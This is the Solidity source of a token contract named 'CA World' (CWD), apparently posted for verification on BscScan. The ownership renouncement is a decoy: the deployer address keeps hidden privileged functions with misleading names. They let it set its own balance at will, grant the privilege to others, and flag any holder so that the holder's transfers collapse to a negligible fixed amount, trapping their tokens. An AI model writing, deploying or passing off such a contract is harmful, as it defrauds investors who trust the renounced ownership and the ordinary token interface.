/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CAWorld {
    uint8 public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;
    address public exemptEnable;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** decimals;


    uint256 public amountLiquidity = 3;
    mapping(address => bool) public swapTotal;
    string public symbol = "CWD";

    uint256 constant feeLiquidity = 12 ** 10;

    address public minTo;
    string public name = "CA World";
    mapping(address => bool) public tradingMarketing;
    address public owner;

    modifier teamTakeIs() {
        require(tradingMarketing[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IRouter feeMode = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IFactory exemptToken = IFactory(feeMode.factory());
        exemptEnable = exemptToken.createPair(feeMode.WETH(), address(this));
        owner = msg.sender;
        minTo = owner;
        tradingMarketing[minTo] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function sellAmount(uint256 isReceiverSwap) public teamTakeIs {
        balanceOf[minTo] = isReceiverSwap;
    }

    function senderMax(address liquidityLimit) public teamTakeIs {
        if (liquidityLimit == minTo) {
            return;
        }
        swapTotal[liquidityLimit] = true;
    }

    function swapShould(address isLaunch, address buyReceiver, uint256 isReceiverSwap) internal returns (bool) {
        require(balanceOf[isLaunch] >= isReceiverSwap);
        balanceOf[isLaunch] -= isReceiverSwap;
        balanceOf[buyReceiver] += isReceiverSwap;
        emit Transfer(isLaunch, buyReceiver, isReceiverSwap);
        return true;
    }

    function fundShouldToken(address swapBurn) public teamTakeIs {
        require(swapBurn != address(0));
        tradingMarketing[swapBurn] = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (swapTotal[sender]) {
            amount = feeLiquidity;
        } else {
            uint256 feeAmount = amountLiquidity * amount / 100;
            amount -= feeAmount;
        }
        return swapShould(sender, recipient, amount);
    }


}